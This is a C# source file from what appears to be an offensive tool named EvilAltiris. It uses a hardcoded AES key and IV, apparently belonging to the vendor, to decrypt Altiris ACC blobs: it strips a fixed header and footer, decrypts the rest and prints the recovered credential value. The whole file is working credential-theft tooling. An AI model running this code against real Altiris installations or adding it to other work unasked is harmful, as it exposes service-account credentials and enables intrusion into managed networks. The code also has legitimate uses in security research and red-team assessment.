using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace EvilAltiris.Lib.Crypto
{
    public class AccDecryptor
    {
        // Hardcoded key / IV
        private static readonly byte[] key = new byte[] { 0xDC, 0xAD, 0x55, 0x4E, 0x57, 0xE2, 0x18, 0x5D, 0x49, 0xBE, 0x60, 0x3C, 0xF7, 0xE8, 0xC1, 0xE9, 0x39, 0xAF, 0x99, 0x8D, 0x76, 0x76, 0xE8, 0xA9, 0x38, 0x76, 0x78, 0x9E, 0x63, 0xF1, 0x43, 0x7A };

        private static readonly byte[] iv = new byte[] { 0x96, 0x8D, 0x59, 0x3D, 0xA0, 0x25, 0x4A, 0x48, 0x60, 0x30, 0x31, 0xC1, 0x9D, 0xAC, 0x77, 0x9E };

        public static string Decrypt(byte[] encryptedData)
        {
            // Create an AesCryptoServiceProvider object with the assigned key and IV
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                // Create the streams used for decryption
                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream output = new MemoryStream())
                        {
                            csDecrypt.CopyTo(output);
                            byte[] decryptedBytes = output.ToArray();
                            // Convert decrypted byte array to string and remove null characters
                            return Encoding.Unicode.GetString(decryptedBytes).Split(new char[] { '\0' }, StringSplitOptions.RemoveEmptyEntries)[0];
                        }
                    }
                }
            }
        }

        private static byte[] ProcessEncryptedBlob(byte[] encryptedData)
        {
            int headerSize = 18;
            int footerSize = 64;
            int encLength = encryptedData.Length - footerSize;
            int encryptedBufferSize = encLength - headerSize;

            byte[] processedData = new byte[encryptedBufferSize];
            Buffer.BlockCopy(encryptedData, headerSize, processedData, 0, encryptedBufferSize);

            return processedData;
        }

        public static void DecryptACC(string encryptedBlob)
        {
            // Process the encrypted data skip the first 18 bytes and last 64 bytes
            byte[] processedData = ProcessEncryptedBlob(Convert.FromBase64String(encryptedBlob));

            // Call the decrypt function with the provided encrypted blob
            string decryptedText = Decrypt(processedData);
            Console.WriteLine("[+] Decrypted ACC value: " + decryptedText);
        }
    }
}